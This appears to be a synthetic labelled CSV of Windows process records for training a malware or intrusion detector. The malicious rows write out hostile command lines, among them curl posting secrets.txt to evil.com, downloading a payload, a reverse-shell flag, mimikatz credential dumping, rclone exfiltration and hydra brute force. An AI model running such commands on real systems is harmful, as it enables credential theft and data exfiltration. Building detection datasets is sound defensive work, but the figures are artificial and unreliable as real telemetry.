process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
node.exe,node.exe,20.944421868903206,14.222614095497732,22847,3367,0,3,1,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,23.76218030892182,27.544091737955874,9604,5437,1,17,0,privilege_escalation
svchost.exe,svchost.exe,8.482203989220976,1.1831621339823668,60699,1974,0,8,0,normal
loic.exe,loic.exe --target 192.168.1.1,76.63962237410726,20.924932089158183,2568,3714,1,963,0,ddos
Slack.exe,Slack.exe,5.850362952520705,11.260386852812182,22618,6026,1,6,0,normal
Discord.exe,Discord.exe,23.985778241499993,4.5865685079652385,24050,9340,0,0,0,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,34.45183216961439,21.831927080974015,34950,8298,1,9,0,privilege_escalation
System,System,4.015034373586119,0.37445822921459326,16249,4876,0,6,1,normal
Slack.exe,Slack.exe,24.786737374903424,4.683257363045856,33486,8563,0,0,1,normal
python.exe,python.exe,23.762526881185387,26.43641169463016,41831,1758,0,8,0,normal
loic.exe,loic.exe --target 192.168.1.1,70.2548528088117,22.355246571863272,62046,2036,1,669,0,ddos
cmd.exe,cmd.exe,3.8374976317526386,2.5411712851819996,7562,379,0,3,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,20.8146090321159,28.426462606523017,37310,4674,1,18,0,trojan
Docker Desktop.exe,Docker Desktop.exe,4.203445379787878,12.473420604438934,61678,9089,1,5,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,93.19251838537171,21.11947851160658,776,4339,0,13,0,brute_force
MsMpEng.exe,MsMpEng.exe,46.67535086618298,4.1447878063611325,37880,2591,0,5,1,normal
Teams.exe,Teams.exe,10.601133279924108,14.131889846835726,18267,2575,1,6,0,normal
devenv.exe,devenv.exe,11.694352257417293,10.450575353554996,44403,9132,0,0,1,normal
devenv.exe,devenv.exe,44.647188485896784,16.17255412900755,37061,6896,0,15,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,98.53462835974037,9.137617172623795,56363,1344,1,11,0,ransomware
loic.exe,loic.exe --target 192.168.1.1,91.39820218892955,13.477800917457415,29013,8055,1,1876,0,ddos
docker.exe,docker.exe,12.414033204271291,8.637493430200099,29633,4644,0,7,1,normal
devenv.exe,devenv.exe,64.84352528352493,12.044155622113795,13868,7394,1,7,0,normal
Docker Desktop.exe,Docker Desktop.exe,25.592998644997532,11.384696707168768,53635,7980,1,13,1,normal
psexec.exe,psexec.exe \\target -s cmd.exe,37.31661651345843,5.660357852088289,19334,1562,1,11,0,privilege_escalation
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,13.13185489313176,28.37486337611962,19710,2759,0,4,0,data_exfiltration
lsass.exe,lsass.exe,3.2151204529696757,1.7679592136535114,43962,3905,0,9,0,normal
wsl.exe,wsl.exe,46.273345648759964,1.0040970798585762,13390,4598,1,10,0,normal
stress.exe,stress.exe --cpu 16 --flood,96.40354333410085,11.705430881072752,13207,5592,1,105,0,ddos
python3.exe,python3.exe,56.05095593185856,14.061771386148298,36141,363,0,11,0,normal
lsass.exe,lsass.exe,4.746486530736582,0.572584956841161,31708,2208,0,15,1,normal
encrypt.exe,encrypt.exe --recursive C:\Users,95.33563549383389,23.056918431803705,36484,4543,1,14,0,ransomware
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,38.682095418914116,9.506322567780199,35178,7364,1,313,0,brute_force
npm.exe,npm.exe,6.371283857028997,8.586087696630052,43638,4280,1,8,0,normal
cmd.exe,cmd.exe,28.908598721582933,1.5880037542205927,14275,400,1,13,0,normal
payload.exe,payload.exe --silent,72.64851435059057,23.792909335145083,36061,818,0,8,0,malware
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,34.55936018451905,22.87444621928154,56782,4906,0,11,0,malware
explorer.exe,explorer.exe,3.693737152422021,1.5070906203428316,49357,3696,1,12,1,normal
git.exe,git.exe,22.329137479981664,1.7490757232383638,29831,7433,0,6,0,normal
Teams.exe,Teams.exe,1.2446391371120646,14.249759925281166,60691,4902,1,8,0,normal
backdoor.exe,backdoor.exe --persist,22.068290197479747,8.45299722535867,5251,5184,0,10,0,malware
payload.exe,payload.exe --silent,72.69232107952476,23.67146664569773,31488,2047,0,6,0,malware
scvhost.exe,scvhost.exe,33.47783388684727,29.925697531801656,61748,4907,1,15,0,malware
csrss.exe,csrss.exe,1.806600324169163,0.16803464893427467,36147,597,0,13,0,normal
msedge.exe,msedge.exe,54.69906381195559,22.958981227457876,12299,3747,0,13,0,normal
ransom.exe,ransom.exe --encrypt --payment,93.51296312306371,24.53849258348735,868,8025,1,6,0,ransomware
Teams.exe,Teams.exe,33.10579031464009,13.06659886668854,31800,8282,0,5,0,normal
svchosts.exe,svchosts.exe -connect evil.com,31.17716551904256,16.096062636682532,33917,9238,1,0,0,malware
svchost.exe,svchost.exe,1.8849221013841029,2.8934722148666685,1822,4217,0,9,0,normal
scvhost.exe,scvhost.exe,26.598789794376938,27.180477451272754,32425,4530,1,6,0,malware
python3.exe,python3.exe,17.572147012602645,14.477355805162041,56730,6955,0,11,0,normal
chrome.exe,chrome.exe,46.437728831950245,24.373795590297625,37036,4697,0,14,0,normal
ransom.exe,ransom.exe --encrypt --payment,68.73798356168282,7.982002814346405,47216,7016,0,13,0,ransomware
powershell.exe,powershell.exe,43.71735345043657,10.952042007474901,2073,8887,0,12,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,24.741591307613472,28.519205776327222,3423,3058,0,0,0,data_exfiltration
encrypt.exe,encrypt.exe --recursive C:\Users,72.43605576606149,28.966266830611854,53871,1268,0,0,0,ransomware
services.exe,services.exe,1.0385606355726917,0.6654657421745624,46824,7232,0,13,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,11.29322399123053,10.168653809164955,42751,8491,1,10,0,data_exfiltration
bash.exe,bash.exe,12.319719497372416,2.3044140729035645,19222,502,0,6,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,24.227692640017104,9.701942481564473,61071,414,0,5,0,privilege_escalation
services.exe,services.exe,0.5767778291625862,0.7353704321826355,49997,4144,0,12,1,normal
python.exe,python.exe,46.8702673469274,22.941878561810395,8543,1650,0,4,1,normal
Discord.exe,Discord.exe,13.52912794516621,9.465349520793712,11484,1599,0,2,1,normal
powershell.exe,powershell.exe,28.814711261351967,8.543875640556353,12056,7142,0,12,0,normal
npm.exe,npm.exe,13.88742455696148,2.0019934087339415,21320,1899,0,11,0,normal
MSBuild.exe,MSBuild.exe,51.89379222206374,3.686678780806151,216,5952,0,12,0,normal
stress.exe,stress.exe --cpu 16 --flood,97.10160102587389,23.20696308869763,39256,7369,1,277,0,ddos
python3.exe,python3.exe,58.34433578759608,7.0875559860803286,23413,8463,0,5,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,18.250693776591646,1.90216764618509,23772,5538,1,7,0,normal
System Idle Process,System Idle Process,84.79527949646265,0.07895192916511831,42925,1761,0,5,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,88.58514583385646,27.563898725997543,8522,2215,1,9,0,brute_force
cryptor.exe,cryptor.exe -aes256 -all,91.46381791508416,28.27370831897949,29263,4105,1,4,0,ransomware
System Idle Process,System Idle Process,94.56193904737017,0.056739578013368736,43257,7481,0,5,0,normal
scvhost.exe,scvhost.exe,35.456542011704705,27.309678886446623,3615,3340,1,18,0,malware
chrome.exe,chrome.exe,41.837451350898895,18.42426605614132,41603,3500,0,9,0,normal
Code.exe,Code.exe,13.148621358381968,9.513533790545333,21981,4490,0,6,0,normal
docker.exe,docker.exe,45.75080730932088,1.8768317931222596,8256,1119,1,9,0,normal
MsMpEng.exe,MsMpEng.exe,65.75003540661287,3.532666901415009,49156,9853,0,3,0,normal
loic.exe,loic.exe --target 192.168.1.1,92.80952482609722,21.47901958070985,41853,4686,1,1708,0,ddos
MSBuild.exe,MSBuild.exe,34.666064248769516,15.96683457744936,60905,9842,1,1,0,normal
chrome.exe,chrome.exe,31.513097651528756,3.66214756699359,19216,6808,0,5,1,normal
Slack.exe,Slack.exe,11.90878471567812,11.639547318447175,5261,4411,0,10,0,normal
firefox.exe,firefox.exe,41.040822171084116,4.918644825589623,2274,5614,0,6,0,normal
services.exe,services.exe,0.5247859394177012,0.5278151841901255,2058,6741,0,8,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,29.38607342306759,8.291017268243579,32116,687,1,3,1,normal
java.exe,java.exe,49.09979596880707,12.386910399658996,44209,5234,0,15,1,normal
winpeas.exe,winpeas.exe,36.306553657317394,22.1101058159147,24954,7853,0,14,0,privilege_escalation
OUTLOOK.EXE,OUTLOOK.EXE,16.054203426308863,14.82178790408237,45069,9573,0,2,0,normal
wsl.exe,wsl.exe,19.368383336725586,4.533065468610156,30820,7505,0,6,0,normal
SearchIndexer.exe,SearchIndexer.exe,0.05513958393345897,2.3466561196262194,9605,4104,0,8,0,normal
msedge.exe,msedge.exe,24.083219231173075,8.353571754578152,52472,9862,1,5,0,normal
Teams.exe,Teams.exe,2.636091520267051,9.500824374204202,7714,2354,1,13,0,normal
powershell.exe,powershell.exe,18.20183396037933,8.613398066045754,57641,9437,0,6,0,normal
git.exe,git.exe,46.35188076442819,1.7415833292441747,529,5599,0,13,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,12.383861135239247,6.2763689083940255,20360,5705,1,6,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,9.726346475688317,10.16823881960374,17109,7682,0,16,0,data_exfiltration
chrome.exe,chrome.exe,44.73255708183566,21.40769980288794,26050,782,0,7,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,95.9636364641338,8.146025917888975,6120,1714,0,7,0,brute_force
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,39.37345650407942,17.370953766064293,1822,6032,1,6,0,data_exfiltration
dwm.exe,dwm.exe,20.155701351149602,2.958340300191254,41335,2810,1,12,1,normal
cmd.exe,cmd.exe,8.70719193736011,1.0238638529746584,36968,6901,0,12,1,normal
OUTLOOK.EXE,OUTLOOK.EXE,14.831485200298614,4.57157253404539,40360,1680,0,6,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,7.543644846267208,10.028558519040304,4010,697,0,17,0,data_exfiltration
Teams.exe,Teams.exe,31.565756113349572,12.11796515030719,49735,4508,1,2,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,33.89350654826625,6.285044499792868,31690,4599,0,4,0,trojan
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,87.08595236595082,8.380328391746717,36517,9804,1,8,0,brute_force
OUTLOOK.EXE,OUTLOOK.EXE,13.008345561690772,7.745750155978251,33956,7926,0,12,0,normal
firefox.exe,firefox.exe,0.8384737645395135,12.652952955129642,8452,1430,0,14,0,normal
wsl.exe,wsl.exe,27.26295809914763,4.672698794556822,3555,188,1,4,0,normal
SearchIndexer.exe,SearchIndexer.exe,6.476560412968471,4.672161679013507,22995,7600,1,13,1,normal
cryptor.exe,cryptor.exe -aes256 -all,95.56806785246665,23.65301361767474,6772,9904,1,6,0,ransomware
git.exe,git.exe,12.918355426624434,4.130586831949955,18872,8450,1,13,0,normal
lsass.exe,lsass.exe,2.219893005564958,0.9447575634688878,41819,7667,0,0,0,normal
hping.exe,hping.exe --flood -p 80 target.com,84.11127902917961,26.42092545124534,19669,390,1,2725,0,ddos
tsc.exe,tsc.exe,86.38569352969073,5.107447132901132,63365,1265,1,6,0,normal
ransom.exe,ransom.exe --encrypt --payment,81.50087953713873,17.892926570907242,36327,4200,0,13,0,ransomware
svchost.exe,svchost.exe,10.097013910325666,2.6952210704107795,61478,6540,1,10,0,normal
java.exe,java.exe,7.737971444341496,17.973650771802966,12101,2767,0,0,0,normal
cryptor.exe,cryptor.exe -aes256 -all,83.11326830593181,12.00221439030335,33483,9207,0,19,0,ransomware
tsc.exe,tsc.exe,28.796958022299247,1.279181408024282,30123,4942,0,15,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,22.241628754557738,24.669027341897852,49136,4685,1,6,0,trojan
payload.exe,payload.exe --silent,60.98385331564223,20.869401156908403,37090,1659,1,14,0,malware
msedge.exe,msedge.exe,15.12091896652028,12.193255818128623,2828,5283,1,2,0,normal
tsc.exe,tsc.exe,26.109896900008856,9.919180579566437,7273,7261,0,15,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,95.6728975794918,11.372099361155978,7732,5894,1,0,0,brute_force
firefox.exe,firefox.exe,50.51577040589115,2.1653769279127815,59223,6197,1,15,1,normal
System Idle Process,System Idle Process,89.53463430137852,0.07541358489569822,33931,7678,0,3,0,normal
csrss.exe,csrss.exe,1.0557678173655947,0.617727549882078,21562,2603,0,7,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,20.812981142507443,25.120150153869925,53575,2925,1,7,0,trojan
git.exe,git.exe,26.68183537261919,1.0599401253072613,41933,1776,0,1,0,normal
java.exe,java.exe,87.01477988421486,19.306405965962725,39940,1112,0,9,0,normal
chrome_update.exe,chrome_update.exe --no-ui,16.115851660177064,9.203392431910569,5281,7226,1,14,0,trojan
OUTLOOK.EXE,OUTLOOK.EXE,6.625283743717132,12.270011635117248,62821,4225,1,12,1,normal
SearchIndexer.exe,SearchIndexer.exe,10.227997709851962,1.2066629766981851,2758,7393,0,2,1,normal
git.exe,git.exe,25.66267169049037,1.4010256937540633,331,7706,0,10,0,normal
backdoor.exe,backdoor.exe --persist,22.272194891138994,29.83288218018972,37484,849,1,20,0,malware
cmd.exe,cmd.exe,4.978264262168036,2.581551406564884,20819,8610,0,13,0,normal
firefox.exe,firefox.exe,34.00819977646241,23.530191647076894,30709,9516,1,2,0,normal
lsass.exe,lsass.exe,3.912317897811686,1.7482133289691122,16452,8053,0,14,1,normal
MsMpEng.exe,MsMpEng.exe,13.221513481446143,9.19243414778439,6742,427,0,3,1,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,46.91808039324704,9.842422618297782,48788,7693,0,16,0,privilege_escalation
csrss.exe,csrss.exe,1.4829833404400925,0.5797509152306213,27428,1046,0,10,1,normal
tsc.exe,tsc.exe,48.10611256464175,3.328482618960037,30113,8574,0,2,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,0.40684598742991573,1.1466547533045603,29407,2955,1,15,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,91.7252475883513,23.89305996277414,44790,893,0,3,0,brute_force
Slack.exe,Slack.exe,15.614427938890737,8.970933185221257,45377,6990,1,10,1,normal
powershell.exe,powershell.exe,58.35263630117801,8.758362226259372,35229,6365,0,13,0,normal
System Idle Process,System Idle Process,95.04691021693856,0.04355378899722582,55396,4632,0,4,0,normal
docker.exe,docker.exe,33.27801883199212,8.847634415037827,24124,5319,1,12,1,normal
mimikatz.exe,mimikatz.exe lsadump::sam,57.49182081551954,29.07446974867645,35293,5165,0,0,0,malware
python.exe,python.exe,90.86868902185114,22.337054327024696,54762,9963,1,3,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,13.02092984933483,3.9453350384195227,59455,9593,0,12,0,normal
chrome_update.exe,chrome_update.exe --no-ui,20.733375528695,14.998146466102456,21217,7954,0,4,0,trojan
svchost.exe,svchost.exe -connect 185.141.62.123:443,27.38531783144137,20.392630884555683,35641,643,1,5,0,trojan
lsass.exe,lsass.exe,3.0799063947607723,1.2259549993353707,11724,2448,1,11,1,normal
services.exe,services.exe,1.6698117252339864,0.8612496533956499,29417,7765,1,3,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,10.798953894780016,21.383097124132643,27637,3823,0,8,0,data_exfiltration
ftp.exe,ftp.exe -s:script.txt evil-server.com,26.081308617303986,7.701263077237242,23084,2696,1,12,0,data_exfiltration
System Idle Process,System Idle Process,88.41387785562792,0.03414444995584091,62106,2417,0,7,1,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,26.558783096358614,15.943513244071108,36291,716,0,16,0,privilege_escalation
npm.exe,npm.exe,5.764474217936899,7.027626449817869,30103,7491,0,11,0,normal
tsc.exe,tsc.exe,25.219425660195625,4.45509904165635,27780,5620,0,6,0,normal
explorer.exe,explorer.exe,1.3191549013015913,1.8409918124365707,62269,7466,0,5,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,94.78394451995345,17.841518242275654,50194,1075,1,11,0,brute_force
csrss.exe,csrss.exe,2.7839373922554156,0.13445149505653664,34488,3402,1,11,1,normal
svchosts.exe,svchosts.exe -connect evil.com,37.940057173228695,10.424052516716156,5324,8923,0,12,0,malware
docker.exe,docker.exe,31.36056889705902,7.7712639626909175,46464,5241,0,4,0,normal
chrome_update.exe,chrome_update.exe --no-ui,33.151266952869236,17.311459686086366,2054,3341,0,19,0,trojan
cryptor.exe,cryptor.exe -aes256 -all,95.95269504077939,14.963743931482675,2647,2807,1,11,0,ransomware
ransom.exe,ransom.exe --encrypt --payment,62.120295387896185,26.72434668620717,889,7469,1,2,0,ransomware
node.exe,node.exe,94.64085685262638,19.37198901851721,60984,1783,0,14,0,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,57.48810878295643,22.549586621847588,10521,2835,1,15,0,privilege_escalation
bash.exe,bash.exe,30.662242857481118,2.4073352983715197,22831,1028,1,15,0,normal
node.exe,node.exe,94.56858293553131,6.293505567727793,25308,9965,1,12,1,normal
stress.exe,stress.exe --cpu 16 --flood,91.77161481218505,7.039763330478248,61897,6221,1,619,0,ddos
ftp.exe,ftp.exe -s:script.txt evil-server.com,29.115969158868516,8.814729796020853,39524,1890,1,9,0,data_exfiltration
stress.exe,stress.exe --cpu 16 --flood,97.66180253263094,7.3026050759260785,21236,1101,1,703,0,ddos
loic.exe,loic.exe --target 192.168.1.1,77.61151160097428,12.248110070295313,19219,8729,1,1792,0,ddos
docker.exe,docker.exe,26.834688437353154,7.36199709252733,47462,8709,0,3,1,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,56.81655365311786,9.788303607943078,35992,1804,0,13,0,brute_force
stress.exe,stress.exe --cpu 16 --flood,95.47887133893376,12.727579496790334,5010,9803,1,345,0,ddos
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,59.50259100547977,13.070488572491612,31375,3782,1,497,0,brute_force
git.exe,git.exe,20.724199688519025,0.8743246919243363,21328,7522,0,3,1,normal
dwm.exe,dwm.exe,22.75316781292765,9.626967899065402,18828,4822,0,9,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,28.70794416418689,19.30871243816949,42496,965,1,10,0,privilege_escalation
Docker Desktop.exe,Docker Desktop.exe,13.577738270023536,12.248560912183907,17076,660,0,15,1,normal
Code.exe,Code.exe,21.10781693744227,10.13630140357013,19584,9311,0,3,0,normal
tsc.exe,tsc.exe,88.12513376139476,5.46602793182538,53461,454,0,9,0,normal
MSBuild.exe,MSBuild.exe,85.02015722756299,2.1948268344940445,64550,9267,0,9,1,normal
System Idle Process,System Idle Process,90.13741584074447,0.015424434130836696,46012,6780,0,2,0,normal
docker.exe,docker.exe,42.69218374525251,9.175539421317344,32135,7701,0,4,0,normal
csrss.exe,csrss.exe,1.9844202765707057,0.7260678117010428,9281,6559,0,8,1,normal
tsc.exe,tsc.exe,32.94448637871368,9.111629944841537,62645,9925,0,12,1,normal
csrss.exe,csrss.exe,0.03886871098602729,0.8063203855455412,56063,8108,0,0,0,normal
System,System,1.215841027280562,0.15284571619691606,18562,3479,0,5,0,normal
docker.exe,docker.exe,28.528428881043727,3.849668355986686,24543,2322,1,4,1,normal
OUTLOOK.EXE,OUTLOOK.EXE,29.02956943997861,6.050496587600373,63906,4532,0,2,1,normal
Discord.exe,Discord.exe,24.097272657379047,12.291591675321918,10095,3485,0,6,0,normal
csrss.exe,csrss.exe,2.099855302267673,0.23841285654312122,31245,2235,0,7,0,normal
Docker Desktop.exe,Docker Desktop.exe,24.228370002259737,4.473100491234945,32781,3688,1,2,0,normal
svchost.exe,svchost.exe,8.829333000724718,0.662798254800349,28024,6981,0,2,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,5.071250618552006,4.458524091514416,5675,2644,1,2,0,normal
